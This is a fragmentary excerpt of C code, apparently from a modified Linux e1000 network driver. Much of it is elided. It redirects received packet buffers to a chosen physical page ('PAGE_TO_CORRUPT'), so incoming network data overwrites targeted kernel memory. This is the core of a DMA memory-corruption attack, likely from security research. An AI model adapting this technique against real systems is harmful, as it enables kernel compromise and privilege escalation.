				   ...
				   int cleaned_count, gfp_t gfp)
{
	...
	while (cleaned_count--) {
		...
		//inserting the address of the page that we would like to corrupt as the location of the socket buffers payload
		//PAGE_TO_CORRUPT and PAGE_SHIFT are macros defined in addresses.h
		skb->data = phys_to_virt((phys_addr_t) ((PAGE_TO_CORRUPT << PAGE_SHIFT) + OFFSET));
...
map_skb:
		...
		printk(KERN_INFO "Successfully remapped buffer at %llx of size %x bytes!\n", buffer_info->dma, adapter->rx_buffer_len);
		//asm volatile ("WBINVD");
		rx_desc = E1000_RX_DESC_EXT(*rx_ring, i);
